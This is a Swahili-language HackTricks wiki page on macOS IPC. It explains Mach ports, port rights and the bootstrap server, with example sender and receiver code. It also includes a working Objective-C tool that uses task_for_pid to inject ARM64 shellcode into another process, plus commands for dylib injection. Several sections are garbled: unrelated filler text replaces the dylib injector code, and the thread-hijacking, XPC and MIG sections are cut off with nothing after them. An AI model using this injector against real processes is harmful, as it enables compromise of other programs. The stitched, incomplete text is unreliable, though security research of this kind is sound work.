# macOS IPC - Inter Process Communication

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Ujumbe wa Mach kupitia Bandari

### Taarifa Msingi

Mach hutumia **kazi** kama **kitengo kidogo** cha kugawana rasilimali, na kila kazi inaweza kuwa na **vijiti vingi**. Hizi **kazi na vijiti vinahusishwa 1:1 na michakato na vijiti vya POSIX**.

Mawasiliano kati ya kazi hufanyika kupitia Mawasiliano ya Michakato ya Mach (IPC), kwa kutumia njia za mawasiliano ya njia moja. **Ujumbe hupitishwa kati ya bandari**, ambazo hufanya kama **safu za ujumbe** zinazosimamiwa na kernel.

Kila mchakato una **jedwali la IPC**, ambapo inawezekana kupata **bandari za mach za mchakato**. Jina la bandari ya mach ni kweli nambari (kielekezi kwa kitu cha kernel).

Mchakato pia unaweza kutuma jina la bandari na baadhi ya haki **kwa kazi tofauti** na kernel itafanya kuingia hii katika **jedwali la IPC la kazi nyingine** ionekane.

### Haki za Bandari

Haki za bandari, ambazo hufafanua ni operesheni gani kazi inaweza kufanya, ni muhimu katika mawasiliano haya. **Haki za bandari** zinaweza kuwa ([maelezo kutoka hapa](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Haki ya Kupokea**, ambayo inaruhusu kupokea ujumbe uliotumwa kwa bandari. Bandari za Mach ni safu za MPSC (wazalishaji wengi, mtumiaji mmoja) safu, ambayo inamaanisha kwamba inaweza kuwepo **haki moja ya kupokea kwa kila bandari** katika mfumo mzima (tofauti na mabomba, ambapo michakato mingi inaweza kushikilia viambatisho vya faili kwa mwisho wa kusoma wa bomba moja).
* **Kazi yenye Haki ya Kupokea** inaweza kupokea ujumbe na **kuunda Haki za Kutuma**, kuruhusu kutuma ujumbe. Awali tu **kazi yenyewe ina Haki ya Kupokea juu ya bandari yake**.
* **Haki ya Kutuma**, ambayo inaruhusu kutuma ujumbe kwa bandari.
* Haki ya Kutuma inaweza **kufanana** hivyo kazi ikiwa na Haki ya Kutuma inaweza kufanana haki na **kuipatia kwa kazi ya tatu**.
* **Haki ya Kutuma mara moja**, ambayo inaruhusu kutuma ujumbe moja kwa bandari na kisha kutoweka.
* **Haki ya Seti ya Bandari**, ambayo inaashiria _seti ya bandari_ badala ya bandari moja. Kutoa ujumbe kutoka kwa seti ya bandari kunatoa ujumbe kutoka kwa moja ya bandari inayojumuisha. Seti za bandari zinaweza kutumika kusikiliza bandari kadhaa kwa wakati mmoja, kama `chagua`/`piga kura`/`epoll`/`kqueue` katika Unix.
* **Jina la Kufa**, ambalo sio haki halisi ya bandari, bali ni nafasi tu. Wakati bandari inaharibiwa, haki zote za bandari zilizopo kwa bandari hiyo zinageuka kuwa majina ya kufa.

**Kazi zinaweza kusafirisha HAKI ZA KUTUMA kwa wengine**, kuwaruhusu kutuma ujumbe nyuma. **HAKI ZA KUTUMA pia zinaweza kufanana**, hivyo kazi inaweza kuiga na kumpa haki kwa kazi ya tatu. Hii, pamoja na mchakato wa kati unaojulikana kama **seva ya bootstrap**, inaruhusu mawasiliano yenye ufanisi kati ya kazi.

### Bandari za Faili

Bandari za faili huruhusu kufunga viambatisho vya faili katika bandari za Mac (kwa kutumia Haki za Bandari za Mach). Inawezekana kuunda `fileport` kutoka kwa FD iliyotolewa kwa kutumia `fileport_makeport` na kuunda FD kutoka kwa fileport kwa kutumia `fileport_makefd`.

### Kuweka Mawasiliano

#### Hatua:

Kama ilivyotajwa, ili kuweka njia ya mawasiliano, **seva ya bootstrap** (**launchd** kwenye mac) inahusika.

1. Kazi **A** inaanzisha **bandari mpya**, ikipata **HAKI YA KUPOKEA** katika mchakato.
2. Kazi **A**, ikiwa mmiliki wa HAKI YA KUPOKEA, **inaunda HAKI YA KUTUMA kwa bandari**.
3. Kazi **A** inaweka **mawasiliano** na **seva ya bootstrap**, ikitoa **jina la huduma ya bandari** na **HAKI YA KUTUMA** kupitia mchakato unaojulikana kama usajili wa bootstrap.
4. Kazi **B** inashirikiana na **seva ya bootstrap** kutekeleza utaftaji wa bootstrap **kwa jina la huduma**. Ikiwa mafanikio, **seva inaiga HAKI YA KUTUMA** iliyopokelewa kutoka kwa Kazi A na **kuhamisha kwa Kazi B**.
5. Baada ya kupata HAKI YA KUTUMA, Kazi **B** inaweza **kutunga** **ujumbe** na kuutuma **kwa Kazi A**.
6. Kwa mawasiliano ya pande zote kawaida kazi **B** inaunda bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).

Seva ya bootstrap **haiwezi kuthibitisha** jina la huduma lililodaiwa na kazi. Hii inamaanisha **kazi** inaweza kwa uwezekano **kujifanya kuwa kazi yoyote ya mfumo**, kama vile **kudai jina la huduma ya idhini** na kisha kuidhinisha kila ombi.

Kisha, Apple huhifadhi **majina ya huduma zilizotolewa na mfumo** katika faili za usanidi salama, zilizoko katika saraka zilizolindwa na SIP: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila jina la huduma, **binary inayohusiana pia imehifadhiwa**. Seva ya bootstrap, itaunda na kushikilia **HAKI YA KUPOKEA kwa kila moja ya majina haya ya huduma**.

Kwa huduma hizi zilizopangwa mapema, **mchakato wa utaftaji unatofautiana kidogo**. Wakati jina la huduma linatafutwa, launchd huanzisha huduma hiyo kwa muda. Mchakato mpya ni kama ifuatavyo:

* Kazi **B** inaanzisha utaftaji wa bootstrap **kwa jina la huduma**.
* **launchd** inachunguza ikiwa kazi inaendeshwa na ikiwa haiko, **inaianzisha**.
* Kazi **A** (huduma) inatekeleza **kuangalia bootstrap**. Hapa, \*\*seva ya bootstrap inaunda HAKI YA KUTUMA, inaishikilia, na **kuhamisha HAKI YA KUPOKEA kwa Kazi A**.
* launchd inafanana **HAKI YA KUTUMA na kuituma kwa Kazi B**.
* Kazi **B** inaunda bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** (huduma) ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).

Hata hivyo, mchakato huu unatumika tu kwa kazi za mfumo zilizopangwa mapema. Kazi zisizo za mfumo bado zinaendesha kama ilivyoelezwa awali, ambayo inaweza kwa uwezekano kuruhusu udanganyifu.

### Ujumbe wa Mach

[Pata maelezo zaidi hapa](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Kazi ya `mach_msg`, kimsingi wito wa mfumo, hutumiwa kutuma na kupokea ujumbe wa Mach. Kazi inahitaji ujumbe utumwe kama hoja ya awali. Ujumbe huu lazima uanze na muundo wa `mach_msg_header_t`, ukifuatiwa na maudhui ya ujumbe halisi. Muundo unafafanuliwa kama ifuatavyo:

```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Mchakato unaomiliki _**haki ya kupokea**_ unaweza kupokea ujumbe kwenye mlango wa Mach. Kinyume chake, **wapelekaji** hupewa _**haki ya kutuma**_ au _**haki ya kutuma mara moja**_. Haki ya kutuma mara moja ni kwa ajili ya kutuma ujumbe mmoja tu, baada ya hapo inakuwa batili.

Ili kufanikisha **mawasiliano ya pande zote** kwa urahisi, mchakato unaweza kutaja **mlango wa mach** katika **kichwa cha ujumbe** wa mach unaoitwa _mlango wa jibu_ (**`msgh_local_port`**) ambapo **mpokeaji** wa ujumbe unaweza **kutuma jibu** kwa ujumbe huu. Bitflags katika **`msgh_bits`** zinaweza kutumika kuonyesha kwamba **haki ya kutuma mara moja** inapaswa kuletwa na kuhamishiwa kwa mlango huu (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Tafadhali elewa kuwa aina hii ya mawasiliano ya pande zote hutumiwa katika ujumbe wa XPC unaotarajia jibu (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kawaida viingilio tofauti** hujengwa kama ilivyoelezwa hapo awali ili kuunda mawasiliano ya pande zote.
{% endhint %}

Vitengo vingine vya kichwa cha ujumbe ni:

* `msgh_size`: ukubwa wa pakiti nzima.
* `msgh_remote_port`: mlango ambao ujumbe huu unatumwa.
* `msgh_voucher_port`: [vifungo vya mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: kitambulisho cha ujumbe huu, ambacho huchambuliwa na mpokeaji.

{% hint style="danger" %}
Tafadhali elewa kuwa **ujumbe wa mach hutumwa juu ya mlango wa mach**, ambao ni **mpokeaji mmoja**, njia ya mawasiliano ya **wapelekaji wengi** iliyojengwa ndani ya kernel ya mach. **Mchakato mwingi** unaweza **kutuma ujumbe** kwa mlango wa mach, lakini wakati wowote ni **mchakato mmoja tu unaweza kusoma** kutoka kwake.
{% endhint %}

### Panga viingilio

```bash
lsmp -p <pid>
```

Unaweza kusakinisha zana hii kwenye iOS kwa kuipakua kutoka [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Mfano wa Kanuni

Tafadhali angalia jinsi **mtumaji** anavyo **tenga** bandari, anajenga **haki ya kutuma** kwa jina `org.darlinghq.example` na kuituma kwa **seva ya bootstrap** wakati mtumaji alipoomba **haki ya kutuma** ya jina hilo na kuitumia kutuma **ujumbe**.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

#### Mawasiliano ya Mchakato wa Ndani kwenye macOS

Kwenye macOS, mawasiliano ya mchakato wa ndani hufanyika kupitia njia mbalimbali za IPC kama vile Mach messages, XPC, na sockets za Unix. Mawasiliano haya yanaweza kutumiwa kwa madhumuni ya kawaida ya mawasiliano kati ya michakato au kwa kusudi la kukiuka usalama.

Kuelewa jinsi mawasiliano ya mchakato wa ndani yanavyofanya kazi ni muhimu kwa kubaini na kuzuia mashambulizi ya kukiuka upendeleo kwenye mfumo wa macOS.

Katika programu hii ya mfano, tunaonyesha jinsi mchakato mmoja unaweza kutuma ujumbe kwa mchakato mwingine kwa kutumia Mach messages. Hii ni mojawapo ya njia za kawaida za IPC kwenye macOS.

Tafadhali kumbuka kuwa ufahamu wa mawasiliano ya mchakato wa ndani unaweza kusaidia katika kuboresha usalama wa mfumo wako wa macOS.

#### Jinsi ya Kutumia Programu

1. Kuanza na kutekeleza `receiver.c` kwenye terminal.
2. Kisha kuanza na kutekeleza `sender.c` kwenye terminal nyingine.

Utaweza kuona jinsi mchakato wa mtumaji unavyotuma ujumbe kwa mchakato wa mpokeaji kupitia Mach messages.

#### Kumbuka

Programu hii ya mfano inalenga kuelimisha tu juu ya mawasiliano ya mchakato wa ndani kwenye macOS. Tumia kwa uwajibikaji na kwa madhumuni ya elimu tu.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```

### Bandari za Haki

* **Bandari ya Mwenyeji**: Ikiwa mchakato ana **ruhusa ya Kutuma** kupitia bandari hii, anaweza kupata **taarifa** kuhusu **mfumo** (k.m. `host_processor_info`).
* **Bandari ya Mwenyeji wa Privilege**: Mchakato wenye **Haki ya Kutuma** kupitia bandari hii anaweza kutekeleza **vitendo vya haki** kama vile kupakia kifurushi cha kernel. **Mchakato lazima awe na mizizi** ili kupata idhini hii.
* Zaidi ya hayo, ili kuita API ya **`kext_request`** ni lazima kuwa na ruhusa nyingine za **`com.apple.private.kext*`** ambazo hupewa tu programu za Apple.
* **Bandari ya Jina la Kazi:** Toleo lisilo na haki la _bandari ya kazi_. Inahusisha kazi, lakini haimruhusu kuidhibiti. Kitu pekee kinachopatikana kupitia hii ni `task_info()`.
* **Bandari ya Kazi** (inayoitwa pia bandari ya kernel)**:** Kwa ruhusa ya Kutuma kupitia bandari hii, ni rahisi kudhibiti kazi (kusoma/kuandika kumbukumbu, kuunda nyuzi...).
* Piga `mach_task_self()` ili **kupata jina** la bandari hii kwa kazi ya mwito. Bandari hii inarithiwa tu wakati wa **`exec()`**; kazi mpya iliyoanzishwa na `fork()` hupata bandari mpya ya kazi (kama kesi maalum, kazi pia hupata bandari mpya ya kazi baada ya `exec()` katika faili ya suid). Njia pekee ya kuzalisha kazi na kupata bandari yake ni kufanya ["ngoma ya kubadilisha bandari"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) wakati wa kufanya `fork()`.
* Hizi ni vizuizi vya kupata bandari (kutoka `macos_task_policy` kutoka kwa programu ya `AppleMobileFileIntegrity`):
* Ikiwa programu ina **ruhusa ya `com.apple.security.get-task-allow`**, mchakato kutoka kwa **mtumiaji huyo anaweza kupata bandari ya kazi** (kawaida huongezwa na Xcode kwa ajili ya kurekebisha makosa). Mchakato wa **kuidhinisha** hautaruhusu hili kwa matoleo ya uzalishaji.
* Programu zenye **ruhusa ya `com.apple.system-task-ports`** zinaweza kupata **bandari ya kazi kwa mchakato wowote**, isipokuwa kernel. Katika toleo za zamani ilikuwa inaitwa **`task_for_pid-allow`**. Hii inatolewa tu kwa programu za Apple.
* **Mizizi inaweza kupata bandari za kazi** za programu **zisizotengenezwa** na **muda wa kukimbia ulioimarishwa** (na sio kutoka kwa Apple).

### Uingizaji wa Shellcode katika mnyororo kupitia Bandari ya Kazi

Unaweza kupata shellcode kutoka:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```

#### Maelezo

Faili hii ina orodha ya ruhusa zinazohitajika na programu ili kufanya kazi fulani kwenye mfumo wa macOS. Kila ruhusa ina jina lake na maelezo ya kina ya kazi inayoruhusiwa kufanywa na programu hiyo.

#### Mfano

```xml
<key>com.apple.security.files.user-selected.read-write</key>
<true/>
<key>com.apple.security.print</key>
<true/>
```

#### Maagizo

1. Hakikisha kuwa ruhusa zote zilizoorodheshwa ni muhimu kwa utendaji wa programu.
2. Epuka kuongeza ruhusa zisizohitajika ambazo zinaweza kuongeza hatari ya usalama.
3. Fanya uhakiki wa mara kwa mara wa ruhusa zilizoorodheshwa ili kudumisha usalama wa mfumo.

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

**Kupasha** programu iliyopita na kuongeza **haki za kufanya kazi** ili uweze kuingiza msimbo na mtumiaji huyo huyo (kama sivyo utahitaji kutumia **sudo**).

<details>

<summary>sc_injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];

NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];

NSFileHandle \*file = \[pipe fileHandleForReading];

\[task launch];

NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid\_t)\[string integerValue]; }

BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;

if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }

inject(pid); }

return 0; }

````
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
````

#### Kuingiza Dylib katika thread kupitia Task port

Katika macOS **threads** inaweza kubadilishwa kupitia **Mach** au kutumia **posix `pthread` api**. Thread tuliyounda katika kuingiza ya awali, iliumbwa kutumia Mach api, hivyo **siyo inalingana na posix**.

Ilikuwa inawezekana **kuingiza shellcode rahisi** ili kutekeleza amri kwa sababu **haikuwa inahitaji kufanya kazi na posix** apis inalingana na Mach tu. **Kuingizaji za ngumu zaidi** zingehitaji **thread** kuwa pia **inalingana na posix**.

Hivyo basi, ili **kuboresha thread** ni vyema kuita **`pthread_create_from_mach_thread`** ambayo itaunda pthread halali. Kisha, pthread mpya hii inaweza **kuita dlopen** ili **kupakia dylib** kutoka kwenye mfumo, hivyo badala ya kuandika shellcode mpya kutekeleza hatua tofauti, ni vyema kupakia maktaba za desturi.

Unaweza kupata **mfano wa dylibs** katika (kwa mfano ule unaotengeneza logi kisha unaweza kusikiliza):

#### Tathmini ya Usalama wa macOS na Kuongeza Mamlaka

**Usanifu wa macOS**

**IPC ya macOS (Mawasiliano kati ya Michakato)**

Katika mifumo ya uendeshaji ya macOS, mawasiliano kati ya michakato hufanyika kupitia njia mbalimbali za IPC kama vile Mach Ports, XPC, sockets, na Apple Events. Hizi ni njia muhimu za mawasiliano ambazo zinaweza kutumiwa na watumiaji wa vibaya kwa kusudi la kuvunja usalama wa mfumo. Kuelewa jinsi mifumo hii ya IPC inavyofanya kazi ni muhimu katika kubaini na kuzuia mashambulizi ya kuvunja usalama.

```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```

#### Kuteka Thread kupitia Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Katika mbinu hii, thread ya mchakato inatekwa:

### XPC

#### Taarifa Msingi

XPC, ambayo inasimama kwa XNU (kernel inayotumiwa na macOS) Inter-Process Communication, ni mfumo wa **mawasiliano kati ya michakato** kwenye macOS na iOS. XPC hutoa njia ya kufanya **wito salama, asinkroni kati ya michakato tofauti** kwenye mfumo. Ni sehemu ya mfumo wa usalama wa Apple, kuruhusu **ujenzi wa programu zilizotenganishwa kwa mamlaka** ambapo kila **sehemu** inaendeshwa na **ruhusa inayohitajika tu** kufanya kazi yake, hivyo kupunguza uharibifu unaoweza kutokea kutokana na mchakato uliokumbwa na shida.

Kwa maelezo zaidi kuhusu jinsi hii **mawasiliano inavyofanya kazi** au jinsi inavyoweza kuwa **dhaifu**, angalia:

### MIG - Mach Interface Generator

MIG ilianzishwa ili **kurahisisha mchakato wa uundaji wa nambari za Mach IPC**. Kimsingi **inazalisha nambari inayohitajika** kwa server na mteja kufanya mawasiliano kulingana na ufafanuzi uliopewa. Hata kama nambari iliyozalishwa ni mbaya, mwandishi wa programu atahitaji tu kuagiza na nambari yake itakuwa rahisi zaidi kuliko hapo awali.

Kwa maelezo zaidi angalia:

### Marejeo

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

</details>
